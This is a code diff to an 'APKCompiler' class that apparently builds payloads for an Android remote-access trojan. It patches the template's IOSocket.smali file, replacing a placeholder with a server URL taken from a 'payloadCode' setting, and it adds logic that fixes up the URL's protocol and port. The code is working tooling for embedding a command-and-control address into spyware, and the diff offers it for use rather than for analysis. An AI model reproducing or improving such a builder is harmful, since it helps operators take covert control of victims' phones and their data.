@@ -77,10 +77,25 @@ class APKCompiler {
     const ioSocketPath = join(tempProjectDir, "smali", "com", "etechd", "l3mon", "IOSocket.smali");
     if (existsSync(ioSocketPath)) {
       let content = readFileSync(ioSocketPath, "utf8");
-      // Placeholder en el template es "http://x:22222?model="
-      const serverUrl = config.payloadCode || "http://localhost:3000"; 
+      
+      // Auto-fix URL (Protocolo y Puerto)
+      let serverUrl = config.payloadCode || "http://localhost:3000";
+      if (!serverUrl.startsWith("http")) serverUrl = `http://${serverUrl}`;
+      
+      // Si no tiene puerto, añadir el puerto por defecto (:3000)
+      const urlObj = new URL(serverUrl);
+      if (!urlObj.port) {
+          const port = process.env.PORT || "3000";
+          serverUrl = `${urlObj.protocol}//${urlObj.hostname}:${port}`;
+      }
+
+      console.log(`[APKCompiler] Injecting Server URL: ${serverUrl}`);
+      // El placeholder en el template es "http://x:22222?model="
       content = content.replace(/http:\/\/x:22222\?model=/g, `${serverUrl}?model=`);
       writeFileSync(ioSocketPath, content);
+      
+      // Guardar el log para el usuario
+      if (!config.payloadCode) config.payloadCode = serverUrl; // Para que aparezca en el log global
     }
 
     // 2. Modificar App Name en strings.xml
